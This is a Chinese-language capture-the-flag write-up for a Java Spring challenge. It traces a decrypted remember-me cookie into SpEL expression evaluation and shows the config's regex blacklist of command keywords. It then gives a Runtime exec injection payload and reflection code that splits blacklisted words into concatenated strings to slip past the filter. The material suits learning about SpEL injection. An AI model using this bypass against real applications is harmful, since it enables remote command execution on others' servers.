---
sidebar_position: 1
tags: [Medium, JavaSec, SPEL]
title: Code-Breaking Puzzles
description: P神的活动
---
# Code-Breaking Puzzles
> 关于资料可以前往 [共享资料/Resources/challenge-0.0.1-SNAPSHOT-20240405211127-6zp33b3.jar](https://pan.baidu.com/s/1PNvMPQsc-F70Lyk7ZNsRrA?pwd=f228)

![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240405212214.png)

使用 IDEA 进行反编译, 随后启动对应的程序进行 DeBug
## 分析
首先查看 `application.yml` 文件,可以看到, 提供一个账号以及一个黑名单
```yaml
spring:
  thymeleaf:
    encoding: UTF-8
    cache: false
    mode: HTML
keywords:
  blacklist:
    - java.+lang
    - Runtime
    - exec.*\(
user:
  username: admin
  password: admin
  rememberMeKey: c0dehack1nghere1
```
代码中的主要逻辑在 `MainController` 中, 首先查看登陆操作, 在用户登陆之后, 如果勾选了 remberMe, 那么浏览器就会存入加密后的 Cookie, 最后跳转到 `hello.html`
```java
@PostMapping({"/login"})
public String login(@RequestParam(value = "username",required = true) String username, @RequestParam(value = "password",required = true) String password, @RequestParam(value = "remember-me",required = false) String isRemember, HttpSession session, HttpServletResponse response) {
    if (this.userConfig.getUsername().contentEquals(username) && this.userConfig.getPassword().contentEquals(password)) {
        session.setAttribute("username", username);
        if (isRemember != null && !isRemember.equals("")) {
            Cookie c = new Cookie("remember-me", this.userConfig.encryptRememberMe());
            c.setMaxAge(2592000);
            response.addCookie(c);
        }

        return "redirect:/";
    } else {
        return "redirect:/login-error";
    }
}
```
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240405213306.png)
随后在 `admin` 请求中会对 Cookie 进行处理
```java
@GetMapping
public String admin(@CookieValue(value = "remember-me",required = false) String rememberMeValue, HttpSession session, Model model) {
    if (rememberMeValue != null && !rememberMeValue.equals("")) {
        String username = this.userConfig.decryptRememberMe(rememberMeValue);
        if (username != null) {
            session.setAttribute("username", username);
        }
    }

    Object username = session.getAttribute("username");
    if (username != null && !username.toString().equals("")) {
        model.addAttribute("name", this.getAdvanceValue(username.toString()));
        return "hello";
    } else {
        return "redirect:/login";
    }
}
```
在上面的处理中, 当判断 `rememberMeValue` 存在后, 就会对其进行解密, 随后将其进行相关赋值, 随后又会调用 `this.getAdcanceValue()`
```java
private String getAdvanceValue(String val) {
    String[] var2 = this.keyworkProperties.getBlacklist();
    int var3 = var2.length;

    for(int var4 = 0; var4 < var3; ++var4) {
        String keyword = var2[var4];
        Matcher matcher = Pattern.compile(keyword, 34).matcher(val);
        if (matcher.find()) {
            throw new HttpClientErrorException(HttpStatus.FORBIDDEN);
        }
    }

    ParserContext parserContext = new TemplateParserContext();
    Expression exp = this.parser.parseExpression(val, parserContext);
    SmallEvaluationContext evaluationContext = new SmallEvaluationContext();
    return exp.getValue(evaluationContext).toString();
}
```
在这一步中可以看到主要是和黑名单做正则匹配, 如果匹配成功就会抛出 `HttpStatus.FORBIDEN` , 如果没有就进行正常流程, 在 `SmallEvaluationContext` 进行 SPEL 表达式解析, 这里就会存在 EI 表达式注入的问题, 因此我们可以构造
```java
Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator"
```
执行命令, 但是使用黑名单机制, 因此需要使用反射来构造调用链, 这样就可以在关键字处使用字符串拼接来达到绕过黑名单的效果
```java
public class RTTI {
    public static void main(String[] args) {
        try {
            Method method = String.class.getClass().forName("java.lang.Runtime").getMethod("exec", String.class);
            Method method1 = String.class.getClass().forName("java.lang.Runtime").getMethod("getRuntime");
            Class<?> aClass = String.class.getClass().forName("java.lang.Runtime");
            System.out.println(method.invoke(method1.invoke(aClass), "whoami"));
        } catch (Exception e) {
            System.out.println("报错");
        }
    }
}

// 进行混淆, 绕过黑名单
String.class.getClass().forName("java.l" + "ang.R" + "untime").getMethod("ex" + "ec", String.class).invoke(String.class.getClass().forName("java.l" + "ang.R" + "untime").getMethod("getRuntime").invoke(String.class.getClass().forName("java.l" + "ang.R" + "untime")), "whoami")
```
随后将其构造为 SPEI 的解析格式, 主要就是改一个 `T()` ,

## 参考文章
- [Code-Breaking Puzzles — javacon WriteUp](http://rui0.cn/archives/1015)